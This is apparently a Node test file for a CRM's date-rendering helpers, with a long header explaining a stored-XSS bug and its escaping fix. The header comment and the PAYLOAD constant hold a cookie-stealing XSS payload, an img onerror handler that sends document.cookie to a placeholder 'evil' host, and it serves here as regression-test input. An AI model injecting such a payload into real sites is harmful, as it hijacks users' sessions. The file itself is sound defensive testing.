/* A date that cannot be parsed is echoed into innerHTML, so it must be escaped.
 *
 * gwDateFormat deliberately falls back to the RAW STORED VALUE for anything it
 * cannot parse — "a malformed date should show as itself, not blank out the row
 * it is in" (public/js/gw_date.js). That is the right call for a date function.
 *
 * The problem is what the callers do with it. There are 40 _p5FmtDate call
 * sites in app_premium.js (an earlier version of this header said 17 — it was
 * wrong, and the count was the whole argument for making the helper the choke
 * point). 38 interpolate the result straight into innerHTML with no escaping,
 * and one renders `clients.since` — a FREE-TEXT input (app_premium.js:5462,
 * placeholder "Jan 2025"), not a date picker, stored as TEXT by
 * migrations/0019_customer_detail.sql. So the fallback path is attacker
 * controlled:
 *
 *   <span class="cd-since">Since <img src=x onerror=fetch('//evil/?c='+document.cookie)></span>
 *
 * — stored XSS in an authenticated CRM, executing for every user who opens that
 * client. On that very line `client.name` and `client.status` ARE escapeHtml'd,
 * so the omission was an oversight rather than a decision.
 *
 * Two entry points, because the callers differ:
 *
 *   _p5FmtDate      escapes — for the 38 sites that interpolate into innerHTML
 *   _p5FmtDateText  does not — for _pqRow and _listRow, which escapeHtml their
 *                   own `sub` argument
 *
 * The first version of this had one function and argued that escaping only the
 * fallback avoided double-escaping at those two. That was backwards: the
 * fallback is the ONLY branch that ever reaches them carrying a special
 * character, so "Q3 '25" arrived on the mobile Financial Hub as the literal
 * text "Q3 &#039;25". XS-07 pins that.
 *
 * The raw path is detected with `out === String(d)`, not by re-parsing.
 * gwDateFormat has TWO raw returns — the parse failure and the catch around
 * toLocaleDateString — and re-parsing only saw the first, so a throw inside
 * Intl returned the raw value UNESCAPED. XS-08 pins that.
 *
 * Run: node --test tests/date-render-escaping.test.mjs
 */
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import test from 'node:test';

const appSource = readFileSync(new URL('../public/js/app_premium.js', import.meta.url), 'utf8');
const gwSource = readFileSync(new URL('../public/js/gw_date.js', import.meta.url), 'utf8');

function region(source, startMarker, endMarker, label) {
  const start = source.indexOf(startMarker);
  assert.ok(start >= 0, `anchor "${startMarker}" is gone — ${label} needs repointing`);
  const end = source.indexOf(endMarker, start + startMarker.length);
  assert.ok(end > start, `end anchor for ${label} is gone`);
  return source.slice(start, end);
}

// The real functions, out of the real files — never a stub.
const escapeHtmlSrc = region(appSource, 'function escapeHtml', '\nfunction ', 'escapeHtml');
// Both variants live between _p5FmtDate and _p5Initials.
const fmtDateSrc = region(appSource, 'function _p5FmtDate', 'function _p5Initials', '_p5FmtDate');

/*
 * gw_date.js is an IIFE that assigns onto `window`, so simply concatenating it
 * does NOT put bare `gwDateFormat` / `gwDateParse` in scope. The first version
 * of this harness did exactly that, which meant _p5FmtDate took its
 * `typeof gwDateFormat !== 'function'` branch and XS-01/XS-02 passed while
 * exercising the load-failure path instead of the real one — they survived a
 * mutation that deleted the fix. Destructuring the names into this scope makes
 * the bare identifiers resolve the way they do in the browser.
 */
function build() {
  return new Function('window', `
    ${gwSource}
    const { gwDateParse, gwDateFormat } = window.gwDate;
    ${escapeHtmlSrc}
    ${fmtDateSrc}
    return { _p5FmtDate, _p5FmtDateText };
  `)({});
}
const { _p5FmtDate, _p5FmtDateText } = build();

test('XS-00 the harness really has the parser in scope', () => {
  // Guards the trap above: if this fails, every assertion below is testing the
  // gw_date.js-is-missing branch and proves nothing about normal operation.
  //
  // Compared against Intl's own output rather than the literal 'Sep 1, 2026':
  // gwDateFormat passes `undefined` as the locale, so it follows the ambient
  // one, and test:browser-js pins TZ but not LANG. The hard-coded string failed
  // under en_GB ('1 Sept 2026') and de-DE ('1. Sept. 2026') with a message
  // claiming the harness was broken.
  const expected = new Date(2026, 8, 1, 12).toLocaleDateString(undefined, {
    month: 'short', day: 'numeric', year: 'numeric',
  });
  assert.equal(_p5FmtDate('2026-09-01'), expected);
  assert.notEqual(expected, '2026-09-01', 'the value was not formatted at all');
});

const PAYLOAD = `<img src=x onerror=fetch('//evil/?c='+document.cookie)>`;

test('XS-01 an unparseable date is escaped, not echoed into innerHTML', () => {
  const out = _p5FmtDate(PAYLOAD);
  assert.doesNotMatch(out, /<img/, 'the raw tag reached the page');
  assert.match(out, /&lt;img/);
  // The handler TEXT survives, and that is fine: with < and > escaped the whole
  // thing is inert text content, not an element. What must not survive is any
  // character that could start a tag or close an attribute.
  assert.doesNotMatch(out, /[<>]/, 'a tag delimiter survived unescaped');
});

test('XS-02 every character that can break out of an attribute or element is escaped', () => {
  for (const [raw, expected] of [
    ['<', '&lt;'], ['>', '&gt;'], ['"', '&quot;'], ["'", '&#039;'],
  ]) {
    const out = _p5FmtDate(`x${raw}y`);
    assert.ok(out.includes(expected), `${raw} was not escaped (got ${out})`);
    assert.ok(!out.includes(raw), `${raw} survived unescaped (got ${out})`);
  }
});

test('XS-03 a real date is untouched, so the two escaping call sites do not double-escape', () => {
  // _pqRow and _listRow escapeHtml their `sub` argument. If _p5FmtDate escaped
  // unconditionally, a formatted date would pass through two escapes. It never
  // contains a special character, so this stays a no-op — but pin it, because
  // the day a locale introduces one, double-escaping shows up as visible
  // entities in the UI.
  const out = _p5FmtDate('2026-09-01');
  assert.doesNotMatch(out, /&(amp|lt|gt|quot|#039);/, `formatted date was escaped: ${out}`);
  assert.match(out, /2026/);
});

test('XS-04 shapes the parser refuses still render, and still safely', () => {
  // gwDateParse refuses '2026-02-30' and '2026' — both now take the raw path,
  // which is exactly why this fix matters more after that change than before.
  for (const value of ['2026-02-30', '2026', '2026-09', '   ']) {
    const out = _p5FmtDate(value);
    assert.doesNotMatch(out, /[<>]/, `${value} rendered unescaped markup`);
  }
});

test('XS-05 an empty value is still the em dash, not an escaped empty string', () => {
  assert.equal(_p5FmtDate(null), '—');
  assert.equal(_p5FmtDate(''), '—');
});

test('XS-06 the escaping helper and the text helper differ only in escaping', () => {
  // Behavioural, not a source-text regex. The previous version pinned the exact
  // spelling of the implementation — and it matched an INVERTED version that
  // escaped the safe Intl output and echoed the attacker-controlled raw value
  // verbatim. A guard that passes against the bug it names is worse than none.
  const payload = '<img src=x onerror=alert(1)>';
  assert.equal(_p5FmtDateText(payload), payload, 'the text variant must NOT escape');
  assert.equal(_p5FmtDate(payload), '&lt;img src=x onerror=alert(1)&gt;');
  // On a value that parses, the two agree exactly — there is nothing to escape.
  assert.equal(_p5FmtDate('2026-09-01'), _p5FmtDateText('2026-09-01'));
});

test('XS-07 a self-escaping caller gets exactly one escape, not two', () => {
  // _pqRow and _listRow run escapeHtml over `sub`. Handing them the escaped
  // form double-escaped precisely the values that carry special characters:
  // "Q3 '25" rendered on the mobile Financial Hub as the literal "Q3 &#039;25".
  const escapeHtml = new Function(`${escapeHtmlSrc}\nreturn escapeHtml;`)();
  for (const raw of ["Q3 '25", 'since 2020 & going', '<img src=x>']) {
    const asCallerRenders = escapeHtml(_p5FmtDateText(raw));
    assert.equal(asCallerRenders, escapeHtml(raw), `double-escaped: ${asCallerRenders}`);
    assert.doesNotMatch(asCallerRenders, /&amp;(lt|gt|quot|#0?39);/, 'entity was escaped twice');
  }
});

test('XS-08 the raw path is detected by comparison, not by a second parse', () => {
  // gwDateFormat has TWO raw returns: the parse failure, and the catch around
  // toLocaleDateString. Asking gwDateParse again only saw the first, so a throw
  // inside Intl returned the raw value unescaped. `out === String(d)` covers
  // both, and parses once.
  assert.doesNotMatch(fmtDateSrc, /gwDateParse\(d\)/,
    '_p5FmtDate re-parses to decide whether to escape — that misses the catch path');
  assert.match(fmtDateSrc, /out === String\(d\)/);
});

test('XS-09 no direct gwDateFormat call reaches innerHTML unescaped', () => {
  // The class, not the one function. dateStr in superAdmin() was the last
  // direct consumer echoing gwDateFormat's fallback into innerHTML raw; every
  // other direct call site already wrapped in escapeHtml.
  //
  // The two helpers are excluded because they ARE the escaping boundary —
  // _p5FmtDate escapes what gwDateFormat returns, and _p5FmtDateText is
  // deliberately raw for callers that escape themselves (XS-06, XS-07).
  const outside = appSource.split(fmtDateSrc).join('\n');
  const unescaped = outside.split('\n').filter(l =>
    /[^_a-zA-Z]gwDateFormat\(/.test(l) &&
    !/escapeHtml\(/.test(l) &&
    !/^\s*(\/\/|\*)/.test(l),
  );
  assert.deepEqual(
    unescaped.map(l => l.trim().slice(0, 70)), [],
    'these call gwDateFormat without escaping its raw fallback',
  );
});
